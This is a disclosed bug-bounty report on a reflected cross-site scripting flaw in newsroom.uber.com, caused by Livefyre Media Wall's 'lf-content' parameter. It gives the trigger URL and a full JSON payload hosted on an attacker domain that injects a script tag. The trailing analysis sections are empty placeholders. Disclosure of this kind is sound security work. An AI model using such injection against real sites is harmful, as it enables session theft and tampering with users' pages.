---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '134061'
original_report_id: '134061'
title: Reflected XSS via Livefyre Media Wall in newsroom.uber.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-04-23T16:36:59.846Z'
disclosed_at: '2016-05-09T22:32:18.785Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS via Livefyre Media Wall in newsroom.uber.com

## Metadata

- HackerOne Report ID: 134061
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-05-09T22:32:18.785Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello @uber,
This vulnerability works in all sites where there [Livefyre Media Wall](http://web.livefyre.com/apps/mediawall/ "Livefyre Media Wall"), including [newsroom.uber.com](https://newsroom.uber.com/ "Uber News").
To reproduce this Cross-Site Scripting, visit this URL: https://newsroom.uber.com/?lf-content=danylod.com/uber.php?:131560603:307477931
Vulnerable is this source code: https://cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js
Parameter `lf-content` can be controlled to load JSON file as follows: 
```
lf-content=controlled-domain:GET parameter 'collection_id':GET parameter 'content_id'
```
Browser try to upload content from:
```
https://bootstrap.controlled-domain/api/v3.0/content/thread/?collection_id=GET+parameter+'collection_id'&content_id=GET+parameter+'content_id'&depth_only=false
```
So, on https://bootstrap.danylod.com/uber.php i placed this JSON content:
```
{
  "status": "ok",
  "code": 200,
  "data": {
    "content": [
      {
        "source": 0,
        "collectionId": "131560603",
        "content": {
          "generator": {
            "id": "livefyre.com"
          },
          "bodyHtml": "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>",
          "annotations": {
            "likedBy": [
              "54c1e33eb841b37995000d5d@engadget.fyre.co"
            ]
          },
          "authorId": "50782a81bc6bf341d3002b97@engadget.fyre.co",
          "createdAt": 1431144598,
          "parentId": "307291329",
          "updatedAt": 1431144598,
          "id": "307477931",
          "ancestorId": "307291329"
        },
        "vis": 1,
        "type": 0,
        "event": 1431269111210110
      }
    ],
    "meta": {
      "page": 0
    },
    "authors": {
      "50782a81bc6bf341d3002b97@engadget.fyre.co": {
        "displayName": "MDV",
        "tags": [],
        "profileUrl": "https://hackerone.com/mdv",
        "avatar": "https://bootstrap.danylod.com/mdv.png",
        "type": 1,
        "id": "50782a81bc6bf341d3002b97@engadget.fyre.co"
      }
    }
  }
}
```
Via JSON parameter `bodyHtml` i can inject HTML code, see screenshot F89055\.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
